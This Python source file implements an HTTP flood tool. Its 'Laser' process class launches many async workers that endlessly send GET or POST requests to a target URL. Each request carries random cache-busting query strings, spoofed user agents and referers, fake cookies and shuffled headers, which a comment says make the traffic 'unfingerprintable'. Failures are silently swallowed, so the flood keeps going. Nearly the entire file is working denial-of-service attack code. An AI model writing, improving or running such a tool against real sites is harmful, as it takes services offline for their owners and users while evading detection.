import random
import httpx
import asyncio
import logging
from multiprocessing import Process, Manager
from urllib.parse import urlparse

logging.basicConfig(level = logging.INFO,format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except:
    logger.info("Don't have nvloop, use nature asyncio loop")



METHOD_GET = 'get'
METHOD_POST = 'post'
METHOD_RAND = 'random'
TIMEOUT = 0.1

USER_AGENT_PARTS = {
    'os': {
        'linux': {
            'name': ['Linux x86_64', 'Linux i386'],
            'ext': ['X11']
        },
        'windows': {
            'name': ['Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2'],
            'ext': ['WOW64', 'Win64; x64']
        },
        'mac': {
            'name': ['Macintosh'],
            'ext': [f'Intel Mac OS X {random.randint(10, 11)}_{random.randint(0, 9)}_{random.randint(0, 5)}'  for i in range(1, 10)]
        },
    },
    'platform': {
        'webkit': {
            'name': [f'AppleWebKit/{random.randint(535, 537)}.{random.randint(1, 36)}' for i in range(1, 30)],
            'details': ['KHTML, like Gecko'],
            'extensions': [f'Chrome/{random.randint(6, 32)}.0.{random.randint(100, 2000)}.{random.randint(0, 100)} Safari/{random.randint(535, 537)}.{random.randint(1, 36)}' for i in range(1, 30)] + [f'Version/{random.randint(4, 6)}.{random.randint(0, 1)}.{random.randint(0, 9)} Safari/{random.randint(535, 537)}.{random.randint(1, 36)}' for i in range(1, 10)]
        },
        'iexplorer': {
            'browser_info': {
                'name': ['MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0'],
                'ext_pre': ['compatible', 'Windows; U'],
                'ext_post': [f'Trident/{i}.0'  for i in range(4, 6)] + [f'.NET CLR {random.randint(1, 3)}.{random.randint(0, 5)}.{random.randint(1000, 30000)}' for i in range(1, 10)]
            }
        },
        'gecko': {
            'name': [f'Gecko/{random.randint(2001, 2010)}{random.randint(1, 31):02d}{random.randint(1, 12):02d} Firefox/{random.randint(10, 25)}.0'  for i in range(1, 30)],
            'details': [],
            'extensions': []
        }
    }
}


####
# Laser Class
####


class Laser(Process):

    # Counters
    request_count = 0
    failed_count = 0

    # Containers
    url = None
    host = None
    port = 80
    
    referers = []
    useragents = []
    method = METHOD_GET
    counter = None

    # Flags
    runnable = True

    # Options

    def __init__(self, url, coros, counter, agents=None, no_payload=False, debug=False):

        super(Laser, self).__init__()

        self.debug = debug
        self.coros = coros
        self.counter = counter
        parsedUrl = urlparse(url)
        self.path = parsedUrl.path
        self.url = f'{parsedUrl.scheme}://{parsedUrl.netloc}'
        self.host = self.url
        self.agents = agents
        self.loop = asyncio.get_event_loop()
        
        self.no_payload = no_payload
        
        self.referers = [
            'http://www.google.com/',
            'http://www.bing.com/',
            'http://www.baidu.com/',
            'http://www.yandex.com/',
            self.url + '/'
        ]

        self.useragents = [
            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
            'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
            'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
            'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
        ]
        if self.debug:
            logger.setLevel(level=logging.DEBUG)
    # builds random ascii string

    def buildblock(self, size):
        out_str = ''

        _LOWERCASE = list(range(97, 122))
        _UPPERCASE = list(range(65, 90))
        _NUMERIC = list(range(48, 57))

        validChars = _LOWERCASE + _UPPERCASE + _NUMERIC

        for i in range(0, size):
            a = random.choice(validChars)
            out_str += chr(a)

        return out_str

    def get_method(self):
        return random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method

    def run(self):

        
        logger.debug(f"Starting worker {self.name}")

        try:

            tasks = [asyncio.ensure_future(self.task())
                     for x in range(self.coros)]
            self.loop.run_until_complete(asyncio.wait(tasks))
            try:
                self.loop.run_forever()

            except (KeyboardInterrupt, SystemExit):
                self.stop()

        except:
            self.incFailed()
            if self.debug:
                raise
            else:
                pass  # silently ignore

        
        logger.debug(f"Worker {self.name} completed run. Sleeping...")

    async def task(self):
        async with httpx.AsyncClient() as sess:

            while self.runnable:

                try:
                    (path, headers) = self.createPayload()
                    method = self.get_method().upper()
                    url = f'{self.url}{path}'
                    
                    
                    if self.no_payload:
                        
                        await sess.request(method, url)
                    else:

                        await sess.request(method, url, headers=headers)
                        #await sess.request(method, url, headers=headers, timeout=TIMEOUT, verify_ssl=self.sslcheck)
                    
                    
                    
                    self.incCounter()
                except:
                    self.incFailed()
                    if self.debug:
                        raise
                    else:
                        pass  # silently ignore

    def createPayload(self):

        req_url, headers = self.generateData()

        random_keys = [i for i in headers.keys()]
        random.shuffle(random_keys)
        random_headers = {}

        for header_name in random_keys:
            random_headers[header_name] = headers[header_name]

        return (req_url, random_headers)

    def generateQueryString(self, ammount=1):

        queryString = []

        for i in range(ammount):

            key = self.buildblock(random.randint(3, 10))
            value = self.buildblock(random.randint(3, 20))
            element = f"{key}={value}"
            queryString.append(element)

        return '&'.join(queryString)

    def generateData(self):

        returnCode = 0
        param_joiner = "?"

        if len(self.path) == 0:
            self.path = '/'

        if self.path.count("?") > 0:
            param_joiner = "&"

        request_url = self.generateRequestUrl(param_joiner)
        
        http_headers = self.generateRandomHeaders()
        
        return (request_url, http_headers)

    def generateRequestUrl(self, param_joiner='?'):

        return self.path + param_joiner + self.generateQueryString(random.randint(1, 5))

    def generateRandomHeaders(self):

        # Random no-cache entries
        noCacheDirectives = ['no-cache', 'must-revalidate']
        random.shuffle(noCacheDirectives)
        noCache = ', '.join(noCacheDirectives)

        # Random accept encoding
        acceptEncoding = ['\'\'', '*', 'identity', 'gzip', 'deflate']
        random.shuffle(acceptEncoding)
        nrEncodings = random.randint(0, len(acceptEncoding)//2)
        roundEncodings = acceptEncoding[:nrEncodings]

        http_headers = {
            'User-Agent': random.choice(self.useragents),
            'Cache-Control': noCache,
            'Accept-Encoding': ', '.join(roundEncodings),
            'Connection': 'keep-alive',
            'Keep-Alive': str(random.randint(1, 1000)),
            'Host': self.host,
        }

        # Randomly-added headers
        # These headers are optional and are
        # randomly sent thus making the
        # header count random and unfingerprintable
        if random.randrange(2) == 0:
            # Random accept-charset
            acceptCharset = ['ISO-8859-1', 'utf-8',
                             'Windows-1251', 'ISO-8859-2', 'ISO-8859-15', ]
            random.shuffle(acceptCharset)
            http_headers['Accept-Charset'] = f'{acceptCharset[0]},{acceptCharset[1]};q={round(random.random(), 1)},*;q={round(random.random(), 1)}'

        if random.randrange(2) == 0:
            # Random Referer
            http_headers['Referer'] = random.choice(
                self.referers) + self.buildblock(random.randint(5, 10))

        if random.randrange(2) == 0:
            # Random Content-Trype
            http_headers['Content-Type'] = random.choice(
                ['multipart/form-data', 'application/x-url-encoded'])

        if random.randrange(2) == 0:
            # Random Cookie
            http_headers['Cookie'] = self.generateQueryString(
                random.randint(1, 5))

        return http_headers
    # get agent
    def getUserAgent(self):

        if self.agents:
            return random.choice(self.agents)

        # Mozilla/[version] ([system and browser information]) [platform] ([platform details]) [extensions]

        # Mozilla Version
        # hardcoded for now, almost every browser is on this version except IE6
        mozilla_version = "Mozilla/5.0"

        # System And Browser Information
        # Choose random OS
        os = USER_AGENT_PARTS['os'][random.choice(
            list(USER_AGENT_PARTS['os'].keys()))]
        os_name = random.choice(os['name'])
        sysinfo = os_name

        # Choose random platform
        platform = USER_AGENT_PARTS['platform'][random.choice(
            list(USER_AGENT_PARTS['platform'].keys()))]

        # Get Browser Information if available
        if 'browser_info' in platform and platform['browser_info']:
            browser = platform['browser_info']

            browser_string = random.choice(browser['name'])

            if 'ext_pre' in browser:
                browser_string = f"{random.choice(browser['ext_pre'])}; {browser_string}"

            sysinfo = f"{browser_string}; {sysinfo}"

            if 'ext_post' in browser:
                sysinfo = f"{sysinfo}; {random.choice(browser['ext_post'])}"

        if 'ext' in os and os['ext']:
            sysinfo = f"{sysinfo}; {random.choice(os['ext'])}" 

        ua_string = f"{mozilla_version} ({sysinfo})"

        if 'name' in platform and platform['name']:
            ua_string = f"{ua_string} {random.choice(platform['name'])}"

        if 'details' in platform and platform['details']:
            ua_string = f"{ua_string} ({random.choice(platform['details'])})" if len(
                platform['details']) > 1 else platform['details'][0]

        if 'extensions' in platform and platform['extensions']:
            ua_string = f"{ua_string} {random.choice(platform['extensions'])}"

        return ua_string
    # Housekeeping

    def stop(self):
        self.runnable = False
        self.terminate()

    # Counter Functions
    def incCounter(self):
        try:

            self.counter[0] += 1
        except (Exception):
            pass

    def incFailed(self):
        try:
            self.counter[1] += 1
        except (Exception):
            pass
